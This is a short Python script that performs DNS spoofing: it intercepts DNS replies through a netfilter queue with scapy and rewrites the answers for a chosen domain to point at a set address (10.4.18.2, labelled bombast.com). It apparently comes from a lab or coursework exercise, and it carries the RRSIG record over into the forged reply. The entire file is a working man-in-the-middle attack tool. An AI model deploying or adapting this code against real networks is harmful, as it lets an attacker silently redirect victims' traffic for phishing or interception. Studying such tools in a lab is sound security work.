#! /usr/bin/env python2.7

# Sources: byt3bl33d3r, Abdou Rockikz

from scapy.all import *
from netfilterqueue import NetfilterQueue



# TODO with Wai, try source/dest addresses instead of just port when creating iptables rule




BOMBAST_ADDR = '10.4.18.2'  # bombast.com
ISP_DOMAINS = ['atb.com.bombast.com.']  # ISPs to change if in reply

def modify(packet):
    # Convert the raw packet to a scapy compatible string
    scapy_pkt = IP(packet.get_payload())

    # Modify packet payload
    if scapy_pkt.haslayer(DNSRR):
        # If the packet is a DNS Resource Record (DNS reply)
        # Modify the packet
        print("[Before]:", scapy_pkt[DNS].an)
        try:
            scapy_pkt = changeToBombast(scapy_pkt)
        except IndexError:
            # Not UDP packet, this can be IPerror/UDPerror packets
            pass

        print("[After]: ", scapy_pkt[DNS].an)

        # Set the packet content to our modified version
        packet.set_payload(bytes(scapy_pkt))

    # Accept the packet
    packet.accept()

# Changes the answer portion of the given packet from other ISP addr
# to bombast addr if one is found
def changeToBombast(scapy_pkt):
    # Get the DNS question name, the domain name
    qname = scapy_pkt[DNSQR].qname
    if qname not in ISP_DOMAINS:
        # Don't modify if the question is a non-ISP domain
        print('No modification:', qname)

        # New calculations are required (scapy will do automatically)
        del scapy_pkt[IP].len
        del scapy_pkt[IP].chksum
        del scapy_pkt[UDP].len
        del scapy_pkt[UDP].chksum

        return scapy_pkt

    # Craft new answer
    if scapy_pkt[DNS].ancount > 1:
        # Packet has RRSIG, store for later
        rrsig_answer = scapy_pkt.an[1]
        # Set the rdata for the IP we want to redirect (bombast.com) with RRSIG on the end
        scapy_pkt[DNS].an = DNSRR(rrname=qname, type=1, rclass=1, ttl=604800, rdata=BOMBAST_ADDR)/rrsig_answer
    else:
        # Set the rdata for the IP we want to redirect (bombast.com)
        scapy_pkt[DNS].an = DNSRR(rrname=qname, type=1, rclass=1, ttl=604800, rdata=BOMBAST_ADDR)

    # Delete checksums and length of packet, because we have modified the packet
    # New calculations are required (scapy will do automatically)
    del scapy_pkt[IP].len
    del scapy_pkt[IP].chksum
    del scapy_pkt[UDP].len
    del scapy_pkt[UDP].chksum

    # Return the modified packet
    return scapy_pkt

nfqueue = NetfilterQueue()  

# 1 is the iptables rule queue number, modify is the callback function
nfqueue.bind(1, modify) 
try:
    print "Waiting for packets...\n"
    nfqueue.run()
except KeyboardInterrupt:
    pass
